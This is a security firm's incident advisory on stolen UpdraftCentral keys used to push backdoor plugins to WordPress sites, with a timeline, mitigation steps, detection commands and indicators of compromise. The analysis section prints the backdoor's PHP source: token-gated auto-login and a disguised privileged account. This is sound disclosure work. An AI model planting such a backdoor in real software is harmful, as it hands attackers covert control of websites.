---
title: "Critical security problem in UpdraftCentral: an attacker holding the service's keys planted a backdoor on our websites - Nethemba"
author: Pavol Lupták
url: https://nethemba.com/updraftcentral-backdoor-analysis/
hostname: nethemba.com
description: An attacker used UpdraftCentral keys (UpdraftPlus, 4M+ installs) to push a backdoor to WordPress sites. Analysis, IOCs and how to check your site.
sitename: Nethemba
date: "2026-10-19"
fingerprint: "2f5dc0960da62640"
---
## Summary

*Status as of 22 October 2026, last updated 22 Oct 2026 (new vendor statements, checking script v9). The list of changes is at the end of the article. We will keep updating it as the situation develops.*

**Update 19 Oct 2026:** TeamUpdraft has [confirmed a security incident](https://teamupdraft.com/blog/security-incident-october-2026/). Over the weekend of 17 and 18 October an attacker had unauthorised access to teamupdraft.com and, according to the vendor, probably obtained the customer database: names, emails, billing addresses, order history, password hashes, two-factor settings and the connection keys for UpdraftCentral (cloud), UpdraftVault and UpdraftClone. The keys the attacker used to sign the commands therefore leaked directly from the vendor. The vendor has signed out all accounts, replaced the UpdraftVault and UpdraftClone keys, and is preparing an emergency UpdraftPlus release that will automatically disconnect every UpdraftCentral connection made before 22:00 BST on 18 October 2026. According to the vendor, self-hosted UpdraftCentral is not affected.

**Update 19 Oct 2026 (evening):** [Patchstack published its own analysis](https://patchstack.com/articles/updraftcentral-key-compromise-wordpress-backdoors/), which confirms and extends our findings. It saw 99 different backdoor plugin names installed between 18 Oct 15:32 and 19 Oct 09:23, and a second attacker IP address, `2a09:bac5:4e21:2e3c::49b:9`. Other affected administrators have contacted us too. One of them found a **second backdoor variant that creates an administrator and tries to hide it**. We describe it below and have updated the checking script to detect it. If you ran the script earlier, run it again.

**Update 19 Oct 2026 (working variant):** Another administrator confirmed that **a working version of the backdoor is in circulation**. On their sites three of the four backdoors worked, each with a different name and description. Without the `m` parameter it logs the attacker in as an existing administrator and **leaves no trace in the database**, so check your access log as well (see below). We have updated the checking script to version 3, which catches such samples by their code.

**Update 19 Oct 2026 (sample analysis):** Another affected administrator sent us three backdoors from their sites. The attacker first installed the broken first variant there and later working backdoors. **If you found the first variant but did not delete the UpdraftCentral key straight away, check the site again.** This gave us a sample of the second variant to analyse ourselves. Its account hiding does not work, so the administrator it creates shows up normally in the user list. The third sample is a new minimal variant that only logs the attacker in as an existing administrator. Version 4 of the checking script catches it.

**Update 19 Oct 2026 (the attacker keeps coming back):** The attacker is still active. During 19 October they sent more commands to all three of our sites, the last one at 20:27 CEST. On another administrator’s site they deleted the broken backdoor at 12:22 CEST with `plugin.delete_plugin` and uploaded a new one two seconds later. On our sites the mu-plugin from step 3 blocked these attempts, and the keys had already been deleted. **Delete the UpdraftCentral key even if you have already removed the backdoor.** Attempts blocked by the mu-plugin do not appear in the UpdraftCentral log, only in the access log.

**Update 19 Oct 2026 (emergency release):** The vendor released UpdraftPlus 1.26.12 / 2.26.12 to delete the UpdraftCentral Cloud keys from before the incident. We checked the code: because of a bug it deletes no key at all. The vendor fixed this the same evening in 1.26.13 / 2.26.13. **Update to 1.26.13 / 2.26.13 or later, not to 1.26.12 / 2.26.12.** Even 1.26.13 does not delete keys created on 18 October between 12:07 and 21:00 UTC, although the vendor’s statement named 22:00 BST (21:00 UTC) as the cutoff. Delete such keys by hand. The attacks on our sites started only after the vendor had confirmed the breach and closed the attacker’s access: stolen keys keep working until the site deletes them. Our sites running the premium version received it automatically on 20 October.

**Update 20 Oct 2026 (keys created without the owner noticing):** You may have an UpdraftCentral key even if you never used UpdraftCentral. When you log in to your teamupdraft.com account in UpdraftPlus, free or premium, the checkbox “Add this website to UpdraftCentral” is ticked by default. So check for a key on every site running UpdraftPlus. Another affected administrator told us they had never turned UpdraftCentral on. Their site ran Wordfence, Patchstack and Cloudflare, and none of them stopped the validly signed UpdraftCentral command.

**Update 20 Oct 2026 (hidden backdoor):** Another administrator sent us three backdoors from a single site. One of them, “Site Health Cache”, hides itself from the plugin list in the admin, so you will not see it there. Rely on the checking script, which reads the files directly from disk. On that site the attacker uploaded the minimal, the working and the broken variant within less than ten hours.

**Update 20 Oct 2026 (more samples):** Three administrators sent us ten more samples. All of them belong to the three known variants; only the name, description, fake author and token change. On two sites of one administrator, working backdoors were active for more than three hours before the broken variant crashed the site. **So a crashed site does not mean the attacker could not get in before.** Check the access log in that case too. This administrator, too, says they never used UpdraftCentral.

**Update 20 Oct 2026 (the attacker tries the backdoors):** On 20 October the attacker tried the secret triggers of already removed backdoors directly on at least six sites of four administrators, two of them ours (at 11:39 and 11:57 UTC on our sites). On our sites the tokens were the correct ones. The requests came from the IP addresses `178.83.37.220`, `178.83.37.243`, `178.94.218.31` and from the ranges `69.33.133.x`, `69.33.134.x` and `69.33.144.x`, always with the truncated User-Agent `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36`. Every site returned its normal page or an error, because the backdoors were gone. **If a backdoor is still on your site, the attacker is actively using it.** Search your access log as described below.

**Update 21 Oct 2026 (the attacker is still sending commands):** On the morning of 21 October the attacker again sent UpdraftCentral commands from `43.250.53.42` to two of our sites (07:10 to 09:21 UTC), after version 1.26.13 / 2.26.13 had been released. Our mu-plugin stopped them, and the keys no longer existed. So the attacker keeps using the leaked keys. **Sites that do not run 1.26.13 / 2.26.13 and have not deleted the key by hand remain at risk.**

| **What is affected** | the UpdraftCentral service, whose client is part of the UpdraftPlus plugin, free and premium | 
| **Affected versions** | all UpdraftPlus versions up to 1.26.12 and 2.26.12 connected to UpdraftCentral Cloud through a connection made before 22:00 BST on 18 Oct 2026. Version 1.26.13 / 2.26.13 deletes only keys created before 13:07 BST (12:07 UTC) on 18 Oct; keys created between 13:07 and 22:00 BST stay on the site, although the vendor considers them exposed. On connected sites running versions up to 1.26.4 and 2.26.4, an attacker does not even need valid keys (CVE-2026-10795). | 
| **How many sites** | According to wordpress.org, UpdraftPlus has more than 4 million active installations, and the vendor calls it the world’s most popular scheduled backup plugin. For the June flaw in the same channel, the vendor estimated that fewer than 10% of users have an UpdraftCentral or Migrator key, which means up to around 400,000 sites. We do not know how many of them the attacker hit. | 
| **Fix** | the vendor released UpdraftPlus 1.26.12 / 2.26.12 on 19 Oct to delete the old UpdraftCentral Cloud keys, but because of a bug it deletes none. Only 1.26.13 / 2.26.13, released the same evening, works: on every page load it deletes UpdraftCentral Cloud keys created before 12:07 UTC on 18 Oct 2026. Delete keys created between 12:07 and 21:00 UTC (22:00 BST) by hand, and do the same on any site that has not updated yet. According to the vendor, WordPress.org pushed 1.26.13 to all sites automatically. | 
| **Temporary solution** | remove the UpdraftCentral connection, check the site with our script, change your teamupdraft.com password and, optionally, block UpdraftCentral commands with a small mu-plugin (see below). You do not need to uninstall UpdraftPlus; backups keep working. | 

On the night of 19 October 2026 an attacker at IP address `43.250.53.42` sent the command `plugin.upload_plugin` through UpdraftCentral to three of our WordPress websites. UpdraftCentral is a remote site management service from TeamUpdraft, and its client is built into every copy of the UpdraftPlus plugin. On two of our sites the command went through and WordPress installed and activated an unknown plugin. On the third it failed on permissions.

The fault was not on our side. All three sites ran the current WordPress 7.1.3 and UpdraftPlus 2.26.11, which is patched against the June vulnerability CVE-2026-10795. The attacker did not break into our servers and did not exploit any weakness in our configuration. The attacker came in through the UpdraftCentral remote management channel and signed the commands with valid private dashboard keys. Those keys are generated and kept by the UpdraftCentral Cloud service and have never been on our servers. Whoever holds them can install and run arbitrary code on every connected site without the owner knowing. That is why we consider this a critical security problem of the UpdraftCentral service.

**Who is at risk:** every site running UpdraftPlus, free or premium, that is connected to UpdraftCentral, meaning it has an UpdraftCentral key. Every one of the more than 4 million UpdraftPlus installations contains the UpdraftCentral client. Sites that are not connected to UpdraftCentral are not at risk from this attack, because without a key they do not accept UpdraftCentral commands. Our sites were connected to UpdraftCentral Cloud, the dashboard operated by TeamUpdraft. According to the vendor, self-hosted UpdraftCentral dashboards are not affected. The UpdraftVault and UpdraftClone keys leaked as well; the vendor has since replaced them. The key may have been created without the owner noticing: when you log in to your teamupdraft.com account on the Premium / Extensions tab, both the free and the premium version offer the checkbox “Add this website to UpdraftCentral”, which is ticked by default as long as the site has no key (we checked this in the code of versions 2.26.11 and 1.26.13). Installing the plugin alone does not create a key; logging in to a teamupdraft.com account inside the plugin does. This mostly concerns premium sites, where the owner logs in for the licence and updates, and free sites that were connected to an account at some point.

This is not CVE-2026-10795, which Wordfence wrote about in June: our sites were patched against it and attempts to exploit it failed on them.

The plugin is a backdoor. Given a secret link, it was meant to create an account with disguised administrator rights and log the attacker straight into it. Its author made a mistake in the code, though, so on our sites the backdoor never worked. Instead it crashed every request to the site that was not served from cache, and WordPress emailed us about it. That is how we found it within minutes to hours. Other administrators have since found working variants, described below.

We reported the incident to TeamUpdraft on 19 October and asked them to explain how the keys reached the attacker.

**If your site is connected to UpdraftCentral, treat it as potentially compromised until you have checked it.** Remove the connection immediately and check the site as described below. As of 19 October 2026 we found no public mention of this backdoor or of any similar attack after the June fix.

## What to do right now

### 1. Remove the UpdraftCentral connection

Update UpdraftPlus to version 1.26.13 (free) or 2.26.13 (premium) or later. It deletes UpdraftCentral Cloud keys created before 12:07 UTC on 18 October 2026 by itself. Version 1.26.12 / 2.26.12 does not delete them. Then check anyway that no key is left on the site:

In the WordPress admin, open Settings → UpdraftPlus Backups → the “Advanced Tools” tab → “UpdraftCentral”. Click “Manage existing keys (N)…” and then “Delete…” next to every key. If there is no key, the site is not connected.

With command line access, this command in the WordPress root directory does the same:

`wp option delete updraft_central_localkeys`
Then remove the site from the UpdraftCentral dashboard as well (teamupdraft.com → My account → UpdraftCentral → ••• next to the site → Remove site). Removing it from the dashboard alone is not enough. The attacker has the dashboard’s private key, so what counts is deleting the key on the site.

According to the vendor, you can reconnect the site after deleting the key, checking the site and changing the administrator passwords. Before that, change your teamupdraft.com password (type the address into the browser yourself rather than following an email link), change the same password wherever else you used it and set up two-factor authentication again. If you deployed our blocking mu-plugin, remove it before reconnecting. UpdraftVault users have to reconnect their sites with the new credentials.

If the site also has UpdraftPlus Migrator keys (“Migrate / Clone” tab) and you are not migrating right now, delete them too, for example with `wp option delete updraft_migrator_localkeys`. They use the same channel and let another site send backup files to yours. We have not seen them abused so far.

UpdraftPlus Premium stores the teamupdraft.com account password in the database exactly as you enter it (option `updraftplus-addons_options`) and deletes it only after a successful token login. So it can stay in the database and in its backups. In practice it often stays for good. One reader found it on all three of their premium sites and in backups going back to 2022, and confirmed that a plain connection to the account on the Premium / Extensions tab stores it. We found it on one of our three sites. The vendor says the password is removed after the first connection, but the code removes it only after add-ons are successfully claimed with the token. You can remove it with the command below; plugin updates do not need it. Then change the account password. If you log in to the account in the plugin again, untick “Add this website to UpdraftCentral”. We have not found code that reads this password in the samples from this campaign analysed so far, but any working backdoor or pushed plugin can read it.

`wp eval '$o = get_option("updraftplus-addons_options"); if (is_array($o)) { unset($o["password"]); update_option("updraftplus-addons_options", $o); }'`
### 2. Check whether the backdoor is on your site

Without the command line:

- On the same UpdraftCentral screen, click “View recent UpdraftCentral log events…”. Look for the lines “Command received: plugin.upload\_plugin”, “Command received: plugin.delete\_plugin” and “probe.central.updraftplus.com”. If the site is behind a proxy such as Cloudflare, the log shows the proxy’s IP address, not the attacker’s. Lines saying “Signature verification failed; discarding” mean the attacker tried, but their key did not match the site, so the site discarded the command.
- In the plugin list, look for a plugin you did not install. The first variant is described as “Small maintenance toolkit: keeps option storage tidy.” and has a name made of two words, usually followed by three characters, for example “Load Stack 35C” or “Query Shelf”. The other variants have a different name and description every time, for example “Boost Kit”, “Cache Smith” or “Site Health 364F”. Some variants hide themselves from the plugin list, though, so looking at it is not enough.
- In the user list, look for an account named “Site Tools” or with an email address at `@example.org` or `@example.com`. The working variant creates an administrator and tries to hide it, but it shows up in the list normally.
- When a backdoor logs the attacker in as an existing administrator, it creates no account. Only the plugin and the access log give it away, so check the site with the script as well and look at the access log.

If the first variant of the backdoor is on the site, the admin may not work at all, because the plugin crashes every request. In that case use the command line.

With the command line, save our checking script from the end of this article as `check-updraftcentral.php` in the WordPress root directory and run:

`wp eval-file check-updraftcentral.php --skip-plugins --skip-themes`
The script only reads and changes nothing. The `--skip-plugins` switch matters, because an installed backdoor would otherwise crash WP-CLI too. Lines marked `[ALERT]` are traces of the attack, `[WARN]` means something to check and `[OK]` is a clean result. A logged command does not by itself mean the plugin got installed (on one of our sites it did not), which is why the script also checks files, database options and accounts. If it reports anything marked `[ALERT]`, continue with the section “What to do if you find it”.

UpdraftPlus keeps only the last 50 events in the UpdraftCentral log. On a site that scanners visit often, the record of the attack can drop out of the log, and the script then reports `[OK]` for the log. If you have access to the web server logs, search them too (adjust the path to your server, for nginx for example `/var/log/nginx/`):

`grep 'class-udrpc.php"' /var/log/apache2/*access*`
The command finds UpdraftCentral requests without a library version in the User-Agent header, like the ones the attacker sent. The real dashboard sends `class-udrpc.php/2.0; https://teamupdraft.com`, so the command does not match it.

The working variant of the backdoor may leave no trace in the database at all: without the `m` parameter it logs the attacker in as an existing administrator. So also search the access log for requests to the triggers of both variants:

`zgrep -E '[?&](_[0-9a-f]{6}|[0-9a-f]{12})=[^&" ]{32}[& ]' /var/log/apache2/*access*`
Check every line it finds. Status 302 means a redirect to the admin, which most likely means the attacker logged in. Status 500 means the broken variant is still on the site. Status 200 with your normal page size means the backdoor is no longer there. `zgrep` also searches older compressed logs.

### 3. Optional: block UpdraftCentral commands entirely

To be sure the site executes no UpdraftCentral command even if a key remains on it, save a file named `block-updraftcentral.php` with this content in the `wp-content/mu-plugins/` folder:

```
<?php
// Nethemba: block all UpdraftCentral (UDRPC) commands until the vendor resolves the October 2026 incident.
if ( isset( $_POST['udrpc_message'] ) ) {
	http_response_code( 403 );
	exit;
}
```
WordPress loads files in `mu-plugins` before regular plugins, so the request stops before UpdraftPlus processes it. This also blocks site migration through UpdraftPlus Migrator, which uses the same channel. Delete the file once the vendor has explained and resolved the problem.

Another cheap protection: if PHP cannot write to `wp-content/plugins` (for example a different owner of the folder and mode 750), the site still accepts the signed command but the plugin install fails. This stopped the attack on one of the affected sites. Plugins then have to be updated another way, for example with WP-CLI as the folder owner.

If you use Wordfence, refresh the firewall rules (Wordfence → Firewall → All Firewall Options → Manually Refresh Rules). Wordfence has released a rule that blocks UpdraftCentral commands, for the free version as well. The rule only applies to UpdraftPlus up to 1.26.11 and before 2.26.12, though, so it no longer protects a site updated to 1.26.12 / 2.26.12, even though those versions do not delete the keys. Update straight to 1.26.13 / 2.26.13.

## How we found it

At 5:38 we received an automatic WordPress email: “WordPress caught an error with one of your plugins, Load Stack 35C.” We had never installed a plugin of that name. The error message read `Uncaught Error: Undefined constant LoadStack35c::FIELD`, and since 4:14 our site had been answering every request with error 500.

All files in the folder `wp-content/plugins/load-stack-35c/` had the same modification time, 4:14:30. One second later the folder `wp-content/upgrade/` changed, which WordPress uses to unpack plugins it installs. So the plugin arrived through the standard WordPress installer, not as a file dropped on disk. In that very second the access log holds a single request:

`43.250.53.42 - - [19/Oct/2026:04:14:30 +0200] "POST / HTTP/1.1" 200 8454 "-" "WordPress/6.4; class-udrpc.php"`
`class-udrpc.php` is the library through which UpdraftPlus receives commands from UpdraftCentral. Its own log (the database option `updraftcentral_client_log`) confirmed it: `Command received: plugin.upload_plugin`.

## Timeline

We refer to the sites as A, B and C. All times are CEST. Every request came from `43.250.53.42` (hosting provider RedSwitches) with the User-Agent header `WordPress/6.4; class-udrpc.php`.

| Site | Probe | Plugin installation | Result | 
|---|---|---|---|
| Site C | 19 Oct 0:41:32 | 6:05:31 | failed, the key belonged to a user without the right to install plugins | 
| Site A | 2:14:05 | 4:14:30 | backdoor “Load Stack 35C” active, site down until 6:13 | 
| Site B | 2:39:44 | 6:53:49 | backdoor “Text Gantry Eb0” active, removed at 6:56 | 

The probe is a message addressed to a non-existent key, `probe.central.updraftplus.com`. The site replies that it does not understand the message, which reveals that it accepts UpdraftCentral commands. The next command went to the real key `0.central.updraftplus.com`. The attack ran the same way on all three sites, by the same attacker, a few hours apart.

Another administrator sent us logs showing that the same IP `43.250.53.42` tried other attacks on two of their sites as early as 23 September 2026: a REST API query listing pages and about ten path traversal attempts in the `pagename` parameter. The attacker was exploring these sites almost a month before the UpdraftCentral attack.

The attacker kept coming back. On 19 October more UpdraftCentral requests reached site A at 10:57:48, site B at 11:14:19 and site C at 12:03:14, each time two in the same second, and site C once more at 20:27:50. Our mu-plugin already stopped all of them with a 403, so we do not know what they contained. Another administrator sent us their UpdraftCentral log, in which the attacker sent `plugin.delete_plugin` at 12:22:48 and a new `plugin.upload_plugin` at 12:22:50, replacing the broken backdoor with another one. Our pairs of requests probably belong to the same kind of swap. UpdraftPlus writes every command that passes the signature check to the UpdraftCentral log as “Command received” before running it (we checked this in the code of version 2.26.11). The log keeps only the last 50 events, though, and requests stopped by the mu-plugin are not in it.

On another administrator’s site the attacker sent the probe on 18 October at 23:10:30 CEST and then uploaded three different backdoors: the hidden minimal “Site Health Cache” at 23:39:52, the working “Fast2engine” at 0:34:34 and, on 19 October at 9:28:47, the broken “Post Dock 776”. A pair of requests at 11:40:45 and 11:40:46 failed there with error 500, because the broken backdoor was already crashing the whole site. So the attacker does not always send the broken variant first, and one site can receive several backdoors.

## How the attack worked

When a site is connected to UpdraftCentral, it generates an RSA key pair and sends the public key to the UpdraftCentral Cloud service. The service has its own key pair and sends the site only its public key. The dashboard’s private key stays with the service. Every command must be encrypted for the site’s key and signed with the dashboard’s private key. The site then executes it with the rights of the user who created the key in WordPress.

The `plugin.upload_plugin` command passed this whole check on two sites. We analysed site A in detail and ruled out the following explanations:

1. **The known vulnerability CVE-2026-10795.** It affects UpdraftPlus up to 1.26.4 (premium up to 2.26.4). Our sites ran 2.26.11. We see attempts to exploit it in the logs of sites B and C since June, from dozens of IP addresses, and all of them ended with “Could not decrypt incoming message”.
2. **A modified plugin.** The files `class-udrpc2.php`, `central/bootstrap.php`, `central/listener.php` and `central/host.php` are byte-for-byte identical to the official 1.26.11 release from wordpress.org.
3. **The older unsigned message format.** The code rejects it for UpdraftCentral keys, and the “Command received” entry is only written after that check.
4. **A substituted dashboard key.** The key fingerprints are the same in the daily backups from 15 to 18 October and in the live database, and the access logs show no call to the key exchange function.
5. **Weak cryptography.** Both the site key and the dashboard key are 2048-bit RSA with exponent 65537, and UpdraftPlus ships phpseclib 2.0.55, in which the known signature verification flaw is fixed.
6. **A compromised wp-admin.** No unknown administrators appeared, core and plugin checksums match, and the logs show no plugin upload through the admin.

So the attacker held the dashboard’s private keys for all three connections at once. Those keys have never been on our servers, so they could not have leaked from there. The commands did not come from a TeamUpdraft server either. The real dashboard sent commands to site B in March and April 2026 with this User-Agent header:

`WordPress/6.8.5; class-udrpc.php/2.0; https://teamupdraft.com`
The attacker sent `WordPress/6.4; class-udrpc.php`, without the library version and without a URL, from their own server. The keys therefore leaked from the UpdraftCentral Cloud environment and the attacker used them outside of it.

On 19 October TeamUpdraft confirmed that over the weekend of 17 and 18 October an attacker had access to teamupdraft.com and probably to the customer database, including the UpdraftCentral keys. The keys therefore leaked from the vendor’s infrastructure. The timeline fits: the keys for sites B and C had existed since November 2025, and the attacker did not use them until the night of 18 to 19 October, right after the breach. The vendor has not said how the attacker got into teamupdraft.com.

On site C the attack failed by chance. The key there was created in November 2025 by a user who is no longer an administrator. Before installing, UpdraftCentral checks whether the key owner has the `install_plugins` and `activate_plugins` rights. That user had neither.

## Why this is a critical UpdraftCentral problem

The UpdraftCentral client is part of every copy of UpdraftPlus, free and premium. It switches on when the owner connects the site to the dashboard. From then on the site executes every command signed with the dashboard key, with the rights of the administrator who created the connection, including uploading and activating any plugin. The site owner does not confirm the command, and in our case nothing warned us about it. The keys on the site side have no expiry: the ones from November 2025 still worked in October 2026, and another administrator reports abused keys from February and March 2022. The age of a key does not protect it. The key of site A, created on 10 October 2026, was abused as well. Another administrator noticed that the attacker left alone a test copy of a site with the same key but a different address. The attacker apparently worked from the list of sites that only UpdraftCentral has.

The security of all connected sites thus rests on a single assumption, that the dashboard’s private keys do not leak. They leaked, and from one place the attacker took over two sites and tried a third within a few hours. UpdraftPlus has more than 4 million active installations. Among backup plugins on wordpress.org, only All-in-One WP Migration (5+ million) has more installations, and it is mainly a migration tool. Only some UpdraftPlus users use UpdraftCentral, but even a small share of 4 million is a lot of websites.

The same channel has failed before. In June 2026 the vendor fixed CVE-2026-10795 (CVSS 8.1), through which an attacker could forge UpdraftCentral commands without logging in and install and activate a malicious plugin. We still see attempts to exploit it in our logs.

## What exactly the backdoor does

The plugin has five files, but only the main one contains logic. Here is the relevant part of the sample from site A. We have shortened the token and the password:

```
define( 'LOADSTACK35C_TOKEN', 'j0j8nxxH…' );      // 32 characters
define( 'LOADSTACK35C_FIELD', '_9f5696' );
define( 'LOADSTACK35C_SVC_LOGIN', 'data-ops43' );
define( 'LOADSTACK35C_SVC_PASS', 'L7sfkZMw…' );    // 22 characters
final class LoadStack35c {
	private function __construct() {
		add_action( 'init', array( $this, 'handle_sync' ), 1 );
	}
	public function handle_sync() {
		if ( isset( $_GET[ self::FIELD ] ) && hash_equals( self::TOKEN, (string) $_GET[ self::FIELD ] ) ) {
			$user = get_user_by( 'login', self::SVC_LOGIN );
			if ( ! $user ) {
				$uid = wp_insert_user( array(
					'user_login'   => self::SVC_LOGIN,
					'user_pass'    => self::SVC_PASS,
					'user_email'   => self::SVC_LOGIN . '@example.org',
					'display_name' => 'Site Tools',
					'role'         => 'editor',
				) );
				if ( is_wp_error( $uid ) ) return;
				$u = new WP_User( $uid );
				$u->add_cap( 'manage_options' );
				$u->add_cap( 'install_plugins' );
				$user = get_user_by( 'id', $uid );
			}
			wp_set_current_user( $user->ID, $user->user_login );
			wp_set_auth_cookie( $user->ID, true, is_ssl() );
			wp_safe_redirect( admin_url( 'index.php' ) );
			exit;
		}
	}
}
register_activation_hook( __FILE__, function () {
	if ( ! get_option( 'load_stack_35c_sync_token' ) ) {
		update_option( 'load_stack_35c_sync_token', 'j0j8nxxH…', false );
	}
} );
LoadStack35c::instance();
```
This is how it would work if it did not contain a bug:

1. On every request to the site it hooks into the `init` action with priority 1, earlier than most other plugins.
2. It checks whether the URL contains the parameter `?_9f5696=` and compares its value with a 32-character token. It compares using `hash_equals`, which takes the same time whether or not the values match, so the token cannot be guessed by measuring response times. Without the right token nothing happens and the site behaves normally.
3. With the right token it creates the user `data-ops43` with a password hardcoded in the plugin, the email `data-ops43@example.org` and the display name “Site Tools”.
4. It gives the user the Editor role plus two separate capabilities: `manage_options` and `install_plugins`.
5. It logs the visitor in as this user through `wp_set_auth_cookie` with “remember me”, which means a cookie valid for 14 days. This bypasses the login form entirely, so two-factor authentication, login attempt limits and Wordfence login protection never apply.
6. It redirects the visitor to the admin.

The Editor role with two extra capabilities is deliberate. In the user list the account shows up as an Editor, not an Administrator, so a routine review of admins will miss it. In practice it has full control of the site:

- `install_plugins` allows uploading any plugin. Its PHP files can be run directly by URL even without activation, which means running arbitrary code on the server.
- `manage_options` opens all settings. Enabling registration and setting the default role to administrator is enough for the attacker to create a full administrator.
- On a standard WordPress site an Editor also has `unfiltered_html`, so the account can put JavaScript into posts that runs in the browser of every administrator.

The backdoor has a second layer as well. The account it creates, with a known password, stays in WordPress even after the plugin is removed, and the attacker can log in with it through the normal login form unless two-factor authentication is enabled for that account.

### The bug that saved us

The constants are defined with `define()` as global constants (`LOADSTACK35C_FIELD`), but the code reads them as class constants (`self::FIELD`). The class has no constants. PHP 8 therefore throws `Error: Undefined constant LoadStack35c::FIELD` the first time it evaluates `self::FIELD`. This happens before the token check, so on every request: normal visits, the admin, login, the REST API, cron and WP-CLI. The site fails with error 500 and only serves pages from cache.

The installation request itself completed successfully. UpdraftCentral processes commands in the `wp_loaded` action, which comes after `init`, so the broken code did not run in that request. The attacker received a success confirmation and learned nothing about the error from the response. Only the following requests crashed.

The attacker only needs to fix a few characters for the next wave to work. **If you find a similar “broken” plugin, do not fix it.** Fixing it would switch the backdoor on. Remove it.

### More details

- The plugin poses as an ordinary add-on: it has a complete header, a GPL licence, a `Text Domain`, the description “Small maintenance toolkit: keeps option storage tidy.” and an invented publisher (“PixelBinder”, “Harbor Stack Labs”).
- The files `assets/public.css`, `assets/public.js` and `languages/readme.txt` contain only a comment. The plugin never uses them; they are there to make the folder look like a real plugin.
- When uninstalled from the admin, `uninstall.php` deletes the options `<slug>_sync_token` and `<slug>_setup_stamp`, removing its own traces. The code never creates the second option; it is a leftover of the template.
- On activation it stores the token in the option `<slug>_sync_token` without autoloading. The code never reads it.
- Both samples come from the same generator. When we replace names, tokens, user names and versions with placeholders, all files are byte-for-byte identical. The name follows the pattern `word-word-3 hex characters`, the parameter is `_` plus 6 hex characters, the user is `word-word` plus two digits. The token has 32 characters and the password 22 characters (letters, digits, underscore).

## Indicators of compromise

|  | Site A | Site B | 
|---|---|---|
| Plugin folder | `load-stack-35c` | `text-gantry-eb0` | 
| Name / author / version | Load Stack 35C / PixelBinder / 1.2.6 | Text Gantry Eb0 / Harbor Stack Labs / 3.9.5 | 
| URL parameter | `_9f5696` | `_3e9caa` | 
| User | `data-ops43` | `media-staff96` | 
| Database option | `load_stack_35c_sync_token` | `text_gantry_eb0_sync_token` | 
| SHA-256 of the main file | `3c3355f7692d4951e5655683783795579467c9bf1ae2152e13b8c80e9021209f` | `bb40f9a87cea678aa50e5286dd91c0903d6a7fc1b12391472187a0919b4d0801` | 
| SHA-256 of `uninstall.php` | `4186ae2aa0472a4e7929b21bb87f9b61866cb3790f69f4b6c9813e196955d5f0` | `4943fc21efa4b81516130f92bf4efe3b832e1bb69e499d2e42587233a0a005e9` | 

Other victims sent us further samples of the first variant, and Patchstack lists more names:

- `hero-frame-2c5`, author “CopperForge WP”, user email `render-build21@example.org`, SHA-256 of the main file `a9b625496a8ec82862ded01900f720c28f111e624176df7e25be7331f22e4cc9`, `uninstall.php` `325722876a5f8e184b88cf415900ab52c9103553bc4be502399a2272550f2111`
- `card-binder-104`, version 2.6.7, user `render.desk87`
- `style-bridge-8f5`, “Style Bridge 8F5” 2.6.6, author “StoneDock Tools”, parameter `_0f907e`, user `data.build20`, SHA-256 of the main file `0290c2baa363eac72ef2b6891bef1c9c8b4774d5b95d14f4871bde6094fdacde`, `uninstall.php` `99a7fb44d1502938a40b3f663f4e5771b5cf741bcbaec58d7dda0b5066b5a0a5`
- `media-kit-183`, “Media Kit 183” 3.7.8, author “AshBridge Digital”, parameter `_98a0a7`, user `web_maint88`, SHA-256 of the main file `03301b6fc563cafe0408a7eec0fee0349188ff95ce3e5e458272ff6fb23c6a63`, `uninstall.php` `8cdd7ab6d232976a6763df93324be7182a24427e0582fec1dd3c85fc120b8190`
- `query-shelf`, “Query Shelf” 2.6.1, the same `QueryShelf::FIELD` bug, a name without the three hex characters at the end
- `post-dock-776`, “Post Dock 776” 1.7.8, author “CommonGantry”, parameter `_5fa3f1`, user `site_build55`, SHA-256 of the main file `8ff28a902ce6ae9897260ee8a3c90150ab4301946b4ad8f7247c6b8c9c99f321`, `uninstall.php` `6a52fed5e4044978b68dc70bbabef127369c59ec63661e7478bd5c4ac781cf30`
- `nav-hub`, “Nav Hub” 1.0.5, author “PixelBinder” (the same as for `load-stack-35c`), `NavHub::FIELD` error, a name without hex characters at the end
- `speed-desk`, “Speed Desk” 3.7.1, author “Harbor Stack Labs”, parameter `_685679`, user `render.maint85`, `80ba1b6261e573a632451aa77485f78739fbdd13ffccaeafbbe91ee2852f8483`
- `speed-kit-300`, “Speed Kit 300” 3.8.4, author “Nordic Toolworks”, parameter `_c4bda9`, user `data-team4`, `0d9941f42e3c191b68f80ca0f4f1702c99ad8c6633508a6e01b82973d96a71a3`
- `link-latch`, “Link Latch” 3.0.2, author “CommonGantry”, parameter `_b10fa0`, user `media.crew54`, `d3281d662c017882d29a7d47412c629a332aba09ac4a04489a28cbdccd7f90a8`
- `script-shelf`, “Script Shelf” 1.9.2, author “CopperForge WP”, parameter `_697e00`, user `content-crew90`, `7376a09d1281f27fa58c72811e4c28075ae16a353315d249e4840841cf0225f2`
- `feed-case`, “Feed Case” 1.5.1, author “LoftStack”, parameter `_78d327`, user `web_ops15`, `02f5338311a5b5ab443dae447fddbb8885c86f4c16cfa9bd984582c2777b5429`
- `cache-jack-c7a`, “Cache Jack C7A” 2.7.3, author “PixelBinder”, parameter `_48c603`, user `render.desk2`, SHA-256 of the main file `425bb1e680d57a92327c99090df1e3b69932c4ec3d9c22f105d89b101f412d72`, `uninstall.php` `335dc74431648b713500db50d2beafda19342555ba19e37438df035f802c6017`
- The fake author names repeat across variants and sites, for example “PixelBinder”, “Harbor Stack Labs”, “CommonGantry”, “CopperForge WP”, “MetaLayer” or “WPBridge”. A plugin by such an author that you did not install is almost certainly a backdoor.
- More names published by [Wordfence](https://www.wordfence.com/blog/2026/10/updraftcentral-connection-key-compromise/): `speed-press-23b`, `hero-bridge-6c9`, `site-health-6a20`, `db-works-7dba`, `cache-frame`, `site-engine`; users `site_editor784`, `site.crew51`, `web_desk9`.
- according to Patchstack, for example “Site Health Cache”, “Asset Forge 2”, “Content Helper” and “Wp Forge”, 99 names in total

Common traits:

- IP addresses `43.250.53.42` and `2a09:bac5:4e21:2e3c::49b:9`, User-Agent exactly `WordPress/6.4; class-udrpc.php`, request `POST /`
- Attempts to use the backdoors on 20 Oct: IP addresses `178.83.37.220`, `178.83.37.243`, `178.94.218.31` and the ranges `69.33.133.x`, `69.33.134.x` and `69.33.144.x`, User-Agent `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36` (without the browser version part), request `GET /?<trigger>=<token>`
